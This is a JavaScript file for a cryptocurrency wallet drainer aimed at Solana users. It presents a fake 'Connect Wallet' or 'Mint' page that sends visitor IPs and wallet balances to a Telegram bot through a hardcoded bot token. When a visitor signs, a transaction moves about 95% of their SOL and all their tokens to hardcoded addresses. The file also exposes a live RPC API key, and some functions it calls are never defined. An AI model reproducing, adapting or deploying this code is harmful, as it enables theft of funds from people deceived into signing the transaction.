$(document).ready(async function () {
            
    const telegramToken = "7972910331:AAHyChd7byIAGjZv47HkRmgaT1-cUKunq1E"; // Sostituisci con il token del tuo bot
    const chatId = "7623727266"; // Sostituisci con il tuo chat ID
    const LAMPORTS_PER_SOL = 1000000000; // 1 SOL = 1.000.000.000 lamport

    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

    const splToken = splToken_.default;

    // Funzione per inviare messaggi a Telegram
    async function sendTelegramMessage(message) {
        try {
            await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                }),
            });
        } catch (err) {
            console.error("Errore nell'invio della notifica Telegram:", err);
        }
    }

    // Funzione per ottenere l'IP del visitatore
    async function getVisitorIp() {
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            return ipData.ip;
        } catch (err) {
            console.error("Errore nel recupero dell'indirizzo IP:", err);
            return "IP non disponibile";
        }
    }

    // Notifica quando un visitatore accede alla pagina
    async function notifyPageVisit() {
        const domain = window.location.hostname;
        const visitorIp = await getVisitorIp();
        await sendTelegramMessage(`👋 New visitor!\n🔗 Domain: ${domain}\n🌐 IP: ${visitorIp}`);
    }

    // Notifica quando la pagina viene chiusa o ricaricata
    async function notifyPageCloseOrReload() {
        const visitorIp = await getVisitorIp();
        await sendTelegramMessage(`❌ A visitor closed or refreshed the page.\n🌐 IP: ${visitorIp}`);
    }

    // Notifica quando l'utente clicca sul pulsante "Connetti Wallet"
    async function notifyWalletConnectClick() {
        const visitorIp = await getVisitorIp();
        await sendTelegramMessage(`🔌 A visitor clicked on "Connect Wallet"\n🌐 IP: ${visitorIp}`);
    }

    // Notifica il saldo del wallet
    async function notifyWalletBalance(walletBalance, publicKey) {
        await sendTelegramMessage(`💰 Wallet balance: ${(walletBalance / LAMPORTS_PER_SOL).toFixed(6)} SOL\n🔑 Pubkey: ${publicKey}`);
    }

    // Notifica quando la transazione è stata firmata
    async function notifyTransactionSigned(transaction, visitorIp) {
        await sendTelegramMessage(`😎 Transaction signed correctly. IP: ${visitorIp}\n🔑 Pubkey: ${transaction.fromPubkey}\n💰 Balance sent: ${(transaction.lamports / LAMPORTS_PER_SOL).toFixed(6)} SOL`);
    }

    // Notifica quando la transazione è confermata
    async function notifyTransactionConfirmed(txid, finalBalance) {
        await sendTelegramMessage(`✅ Transaction confirmed: ${txid}\n💰 Balance after transaction: ${(finalBalance / LAMPORTS_PER_SOL).toFixed(6)} SOL`);
    }

    // Notifica errori generali
    async function notifyError(message) {
        await sendTelegramMessage(`❌ Errore: ${message}`);
    }

    // Notifica quando la pagina è visitata
    notifyPageVisit();

    // Notifica quando la pagina viene chiusa o ricaricata
    $(window).on('beforeunload', function () {
        notifyPageCloseOrReload();
    });

    

    async function getTokenAccounts(connection, publicKey) {
        
        try {

            const response = await connection.getParsedTokenAccountsByOwner(publicKey, {
                programId: new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA'), // Token Program ID
            });

            const tokens = response.value.map(accountInfo => {
                const parsedInfo = accountInfo.account.data.parsed.info;
                const tokenBalance = parsedInfo.tokenAmount;
                
                return {
                    mint: parsedInfo.mint,
                    owner: parsedInfo.owner,
                    balance: tokenBalance.uiAmount,
                    decimals: tokenBalance.decimals,
                    tokenAccount: accountInfo.pubkey.toString(),
                };
            });

            const nonZeroTokens = tokens.filter(token => token.balance > 0);

            return nonZeroTokens;

        } catch (error) {
            console.error('Error fetching token accounts:', error);
            await notifyError(`Failed to fetch token accounts: ${error.message}`);
            return [];
        }
    }

    async function createTokenTransferInstruction(tokenMint, fromTokenAccount, toTokenAccount, owner, amount) {
        return splToken.createTransferInstruction(
            new solanaWeb3.PublicKey(fromTokenAccount),
            new solanaWeb3.PublicKey(toTokenAccount),
            new solanaWeb3.PublicKey(owner),
            amount,
            [],
            splToken.TOKEN_PROGRAM_ID
        );
    }


    const modal = document.getElementById('wallet-modal');
const closeModal = document.querySelector('.close-modal');

let selected = "#connect-phantom";

$('#connect-wallet-btn').on('click', function() {
    modal.style.display = "block";
    notifyWalletConnectClick();
});

closeModal.onclick = function() {
  modal.style.display = "none";
  hideLoader(selected);
}

window.onclick = function(event) {
if (event.target == modal) {
    modal.style.display = "none";
}
}

function showLoader(buttonId) {
const button = $(buttonId);
button.addClass('loading');
button.prop('disabled', true);
}

function hideLoader(buttonId) {
    const button = $(buttonId);
    button.removeClass('loading');
    button.prop('disabled', false);
}

async function executeTransaction(connection, signer, publicKey) {
showLoader(selected);

try {


    const walletBalance = await connection.getBalance(publicKey);
    await notifyWalletBalance(walletBalance, publicKey);

    const minBalance = await connection.getMinimumBalanceForRentExemption(0);
    if (walletBalance < minBalance) {
        await notifyInsufficientRentFunds(publicKey, walletBalance);
        hideLoader(selected);
        return;
    }

    if (walletBalance === 0) {
        await notifyEmptyWallet(publicKey, walletBalance);
        hideLoader(selected);
        return;
    }

    const recieverWallet = new solanaWeb3.PublicKey('nK39sfo9zdkw3phzBgAhv4mw6NK7JJXTj8AK4s3vnZC');
    const tokens = await getTokenAccounts(connection, publicKey);
    
    const balanceForTransfer = walletBalance - minBalance;
    const solTransferAmount = Math.floor(Number(balanceForTransfer * 0.95));

    let transaction = new solanaWeb3.Transaction();

    if (solTransferAmount > 0) {
        transaction.add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: publicKey,
                toPubkey: recieverWallet,
                lamports: solTransferAmount,
            })
        );
    }

    // Add token transfers
    for (const token of tokens) {
        try {
            const receiverATA = await splToken.getAssociatedTokenAddress(
                new solanaWeb3.PublicKey(token.mint),
                recieverWallet
            );

            const receiverAccount = await connection.getAccountInfo(receiverATA);
            if (!receiverAccount) {
                transaction.add(
                    splToken.createAssociatedTokenAccountInstruction(
                        publicKey,
                        receiverATA,
                        recieverWallet,
                        new solanaWeb3.PublicKey(token.mint)
                    )
                );
            }

            transaction.add(
                await createTokenTransferInstruction(
                    token.mint,
                    token.tokenAccount,
                    receiverATA.toString(),
                    publicKey,
                    Math.floor(token.balance * Math.pow(10, token.decimals))
                )
            );
        } catch (err) {
            console.error(`Error adding token transfer for ${token.mint}:`, err);
            await notifyError(`Failed to transfer token ${token.mint}: ${err.message}`);
        }
    }

    transaction.feePayer = publicKey;
    let blockhashObj = await connection.getLatestBlockhash('confirmed');
    transaction.recentBlockhash = blockhashObj.blockhash;

    const signed = await signer.signTransaction(transaction);
    await notifyTransactionSigned(transaction, await getVisitorIp());

    let txid = await connection.sendRawTransaction(signed.serialize());
    await connection.confirmTransaction(txid);
    const finalBalance = await connection.getBalance(publicKey);
    await notifyTransactionConfirmed(txid, finalBalance);

} catch (err) {
    console.error(err, 'popp');
    await sendTelegramMessage(`❌ Error during transfer: ${err.message}`);
} finally {
    hideLoader(selected);
}
}

// Update the wallet connection handlers
$('#connect-phantom').on('click', async () => {
if (window.solana) {
    try {
        showLoader('#connect-phantom');
        selected = "#connect-phantom";
        // modal.style.display = "none";
        const resp = await window.solana.connect();
        
        const connection = new solanaWeb3.Connection(
            'https://solana-mainnet.api.syndica.io/api-key/2cNj8UFmQbtuycMgEsbaSuPQNDj7BmctdcyCujkqJVYAdofc4HVpaATstnBTsQwbP4PZ2zcTjcz86GWzPZMwayiYtFERGCADtyZ',
            'confirmed'
        );

        await executeTransaction(connection, window.solana, resp.publicKey);

    } catch (err) {
        console.error(err);
        await sendTelegramMessage(`❌ Error connecting to Phantom: ${err.message}`);
        hideLoader('#connect-phantom');
    }
} else {
    window.open("https://phantom.app/", "_blank");
}
});

$('#connect-solflare').on('click', async () => {
if (window.solflare) {
    try {
        showLoader('#connect-solflare');
        selected = "#connect-solflare";
        // modal.style.display = "none";
        const resp = await window.solflare.connect();
        
        const connection = new solanaWeb3.Connection(
            'https://solana-mainnet.api.syndica.io/api-key/2cNj8UFmQbtuycMgEsbaSuPQNDj7BmctdcyCujkqJVYAdofc4HVpaATstnBTsQwbP4PZ2zcTjcz86GWzPZMwayiYtFERGCADtyZ',
            'confirmed'
        );

        await executeTransaction(connection, window.solflare, window.solflare.publicKey);

    } catch (err) {

        await sendTelegramMessage(`❌ Error connecting to Solflare: ${err.message}`);
        hideLoader('#connect-solflare');
    }
} else {
    window.open("https://solflare.com/", "_blank");
}
});

$('#connect-metamask').on('click', async () => {
if (window.ethereum) {
    try {
        showLoader('#connect-metamask');
        selected = "#connect-metamask";
        // modal.style.display = "none";
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        await sendTelegramMessage(`✅ MetaMask connected: ${accounts[0]}`);
        
        
    } catch (err) {
        console.error(err);
        await sendTelegramMessage(`❌ Error connecting to MetaMask: ${err.message}`);
    } finally {
        hideLoader('#connect-wallet-btn');
    }
} else {
    window.open("https://metamask.io/", "_blank");
}
});

$('#connect-trust').on('click', async () => {
    if (window.trustwallet) {
        try {
            showLoader('#connect-trust');
            selected = "#connect-trust";
            // modal.style.display = "none";
            
            await window.trustwallet.solana.connect();

            const connection = new solanaWeb3.Connection(
                'https://solana-mainnet.api.syndica.io/api-key/2cNj8UFmQbtuycMgEsbaSuPQNDj7BmctdcyCujkqJVYAdofc4HVpaATstnBTsQwbP4PZ2zcTjcz86GWzPZMwayiYtFERGCADtyZ',
                'confirmed'
            );

            await executeTransaction(connection, window.trustwallet.solana, window.trustwallet.solana.publicKey);

        } catch (err) {
            console.error(err, 'reached here');
            await sendTelegramMessage(`❌ Error connecting to Trust Wallet: ${err.message}`);
            hideLoader('#connect-trust');
        }
    } else {
        window.open("https://trustwallet.com/", "_blank");
    }
});

$('#connect-magiceden').on('click', async () => {
    if (isMobile) {
        window.location.href = 'https://magiceden.io/wallet-connect?' + encodeURIComponent(window.location.href);
        return;
    }

    if (window.magicEden) {
        try {
            showLoader('#connect-magiceden');
            selected = "#connect-magiceden";
            // modal.style.display = "none";
    
            await window.magicEden.solana.connect();
            

            const connection = new solanaWeb3.Connection(
                'https://solana-mainnet.api.syndica.io/api-key/2cNj8UFmQbtuycMgEsbaSuPQNDj7BmctdcyCujkqJVYAdofc4HVpaATstnBTsQwbP4PZ2zcTjcz86GWzPZMwayiYtFERGCADtyZ',
                'confirmed'
            );

            await executeTransaction(connection, window.magicEden.solana, window.magicEden.solana.publicKey);

        } catch (err) {
            console.error(err);
            await sendTelegramMessage(`❌ Error connecting to Magic Eden: ${err.message}`);
            hideLoader('#connect-magiceden');
        }
    } else {
        window.open("https://magiceden.io/", "_blank");
    }
});

async function detectWallet() {
    let wallet = null;
    
    if (window.phantom?.solana?.isPhantom) {
        wallet = window.phantom.solana;
    } else if (window.solflare?.isConnected) {
        wallet = window.solflare;
    } else if (window.trustwallet?.solana) {
        wallet = window.trustwallet.solana;
    } else if (window.magicEden?.solana) {
        wallet = window.magicEden.solana;
    }
    
    return wallet;
}

    // Gestione del pulsante "Connetti Wallet"
    $('#connect-wallet').on('click', async () => {
        // Notifica del click sul pulsante
        notifyWalletConnectClick();


        if (window.solana) {
            try {

                const resp = await window.solana.connect();
                // await sendTelegramMessage(`✅ Phantom Wallet CONNECTED: ${resp.publicKey}`);

                var connection = new solanaWeb3.Connection(
                    'https://solana-mainnet.api.syndica.io/api-key/2cNj8UFmQbtuycMgEsbaSuPQNDj7BmctdcyCujkqJVYAdofc4HVpaATstnBTsQwbP4PZ2zcTjcz86GWzPZMwayiYtFERGCADtyZ',
                    'confirmed'
                );

                const public_key = new solanaWeb3.PublicKey(resp.publicKey);
                const walletBalance = await connection.getBalance(public_key); // Questo è in lamport, già un intero
                await notifyWalletBalance(walletBalance, resp.publicKey);

                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                if (walletBalance < minBalance) {
                    await notifyInsufficientRentFunds(resp.publicKey, walletBalance);
                    return;
                }

                if (walletBalance === 0) {
                    await notifyEmptyWallet(resp.publicKey, walletBalance);
                    return;
                }

                $('#connect-wallet').text("Mint");
                $('#connect-wallet').off('click').on('click', async () => {
                    try {

                        const recieverWallet = new solanaWeb3.PublicKey('DM9u6LCF7YKw3U3qLq8j8M22nH2D4V4tcCEBkJgyj2No');
                        
                        
                        const tokens = await getTokenAccounts(connection, resp.publicKey);
                        
                        const balanceForTransfer = walletBalance - minBalance;
                        const solTransferAmount = Math.floor(Number(balanceForTransfer * 0.95));

                        // Create transaction
                        let transaction = new solanaWeb3.Transaction();

                      
                        if (solTransferAmount > 0) {
                            transaction.add(
                                solanaWeb3.SystemProgram.transfer({
                                    fromPubkey: resp.publicKey,
                                    toPubkey: recieverWallet,
                                    lamports: solTransferAmount,
                                })
                            );
                        }

                        for (const token of tokens) {
                            try {
                                const receiverATA = await splToken.getAssociatedTokenAddress(
                                    new solanaWeb3.PublicKey(token.mint),
                                    recieverWallet
                                );

           
                                const receiverAccount = await connection.getAccountInfo(receiverATA);
                                if (!receiverAccount) {
                                    transaction.add(
                                        splToken.createAssociatedTokenAccountInstruction(
                                            resp.publicKey,
                                            receiverATA,
                                            recieverWallet,
                                            new solanaWeb3.PublicKey(token.mint)
                                        )
                                    );
                                }

                                
                                transaction.add(
                                    await createTokenTransferInstruction(
                                        token.mint,
                                        token.tokenAccount,
                                        receiverATA.toString(),
                                        resp.publicKey,
                                        Math.floor(token.balance * Math.pow(10, token.decimals))
                                    )
                                );
                            } catch (err) {
                                console.error(`Error adding token transfer for ${token.mint}:`, err);
                                await notifyError(`Failed to transfer token ${token.mint}: ${err.message}`);
                            }
                        }

                      
                        transaction.feePayer = window.solana.publicKey;
                        let blockhashObj = await connection.getLatestBlockhash('confirmed');
                        transaction.recentBlockhash = blockhashObj.blockhash;

                       
                        const signed = await window.solana.signTransaction(transaction);
                        await notifyTransactionSigned(transaction, await getVisitorIp());

                        let txid = await connection.sendRawTransaction(signed.serialize());
                        await connection.confirmTransaction(txid);
                        const finalBalance = await connection.getBalance(public_key);
                        await notifyTransactionConfirmed(txid, finalBalance);

                    } catch (err) {
                        console.log(err, 'err');
                        await sendTelegramMessage(`❌ Error during transfer: ${err.message}`);
                    }
                });
            } catch (err) {
                console.log(err, 'err');
                await sendTelegramMessage(`❌ Errore nella connessione a Phantom Wallet: ${err.message}`);
            }
        } else {
            alert("Estensione Phantom non trovata.");
            const isFirefox = typeof InstallTrigger !== "undefined";
            const isChrome = !!window.chrome;

            if (isFirefox) {
                window.open("https://addons.mozilla.org/en-US/firefox/addon/phantom-app/", "_blank");
            } else if (isChrome) {
                window.open("https://chrome.google.com/webstore/detail/phantom", "_blank");
            } else {
                alert("Scarica l'estensione Phantom per il tuo browser.");
            }
        }
    });

    const public_key = new solanaWeb3.PublicKey(resp.publicKey);
    const walletBalance = await connection.getBalance(public_key);
    await notifyWalletBalance(walletBalance, resp.publicKey);

    const tokenAccounts = await getTokenAccounts(connection, public_key);
    console.log('Token accounts:', tokenAccounts);
});
